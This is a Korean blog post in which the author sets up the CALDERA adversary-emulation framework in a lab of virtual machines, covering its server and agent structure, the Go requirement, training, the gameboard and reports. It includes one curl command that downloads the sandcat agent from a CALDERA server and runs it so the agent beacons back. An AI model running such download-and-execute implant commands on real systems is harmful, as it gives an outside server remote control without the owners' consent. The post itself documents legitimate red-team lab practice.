---
layout: post
title:  "3.CALDERA 이해하기"
date:   2021-01-12
categories: jekyll update
---

##CALDERA 설치 중 알게 된 사실 정리

* 결국은 여러대의 VM이 필요함
* sandcat은 go가 설치되어 있어야 함
* 전체적인 구조

본론부터 말하자면 칼데라는 사이버 킬체인을 구현할 수 있는 시뮬레이터다.
모의해킹을 도와주는 프레임워크라고 말 할 수있다.
그래서 이때까지 구현 한 것은 모의해킹을 전반적으로 관리해 주는 서버인 것이다.
실제로 옛날 문서를 구글링 해 본 결과, 칼데라에는 서버와 에이전트가 따로 존재했다.
즉, 서버가 구축되어 있는 리눅스와 에이전트를 심을 클라이언트 운영체제가 있어야 한다는 것이다.
윈도우나 리눅스, 맥같은 운영체제를 선택할 수 있는 항목이 있는 이유가 여기 있었다.
서버는 오직 리눅스에서, 클라이언트는 각종 운영체제를 선택 할 수 있다.

나는 CentOS를 하나 더 구축해서 에이전트를 투입하고 사이버 공격을 시도하는 실험을 진행했다.
![시작](/img/시작.PNG)
실험을 할 CentOs Desktop

![구조](/img/구조.PNG)
현재 VM 구조

여기서 Agent를 침투시키는 명령어가 있는데,
``server="http://172.30.1.37:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;chmod +x sandcat.go;./sandcat.go -server $server -group red -v``
이 코드를 복사 해서 Desktop Interface의 Putty에 붙여넣어 주었다.
그럼 해당 경로에 `sandcat.go` 라는 go 파일이 생기는데, 여기서 알 수 있듯 **반드시** 해당 컴퓨터에는 go 언어가 깔려 있어야 한다. 여기서 go의 버전은 1.11 이상이여야 한다. 즉, 칼데라 서버에서도 go가 깔려 있어야 하고 침투시킬 PC에서도 go가 깔려 있어야 한다.

![agnet](/img/ㅋㅋㅋ.PNG)
그렇게 되면 저번과 다르게 이렇게 비콘을 통해 지속적으로 신호를 주고 받는다!
또한 2번째 텝에 있었던 능력을 실제로 적용해 진행하는 모습을 보인다.

![1](/img/트레이닝.PNG)
그럼 이렇게 첫 번째 트레이닝을 통과 할 수 있다.
구글링을 해 본 결과 모든 트레이닝을 통과하면 인증서를 발급 받을 수 있다고 한다.
그런데 당장 필요한 기능은 아닌 것 같으니 넘어가자.

![2](/img/뭔가되더라.PNG)
게임보드에 가게 되면 이렇게 red와 blue의 현재 상황을 볼 수 있다.
당연히 blue팀에 대해서는 아무 것도 하지 않았으므로 0점이다.

![3](/img/스크롤.PNG)
모든 작전이 끝나고 나면 이렇게 리포트를 다운받을 수 있는데, 이것 역시 처음과는 다르게 스크롤의 수가 아주 긴 것을 볼 수 있다. 여기서는 시행한 모든 공격에 대한 보고가 자세하게 적혀있다.

###아직 해결하지 못한 문제들
![4](/img/에러.PNG)
서버의 로그 인데, 몇 시에 난 건지는 적혀 있지만 저 당시에 뭘 하고 있었는지는 정확히 알 수가 없다. 그래서 추후에 코드리딩을 통해 문제를 해결 할 것이다.
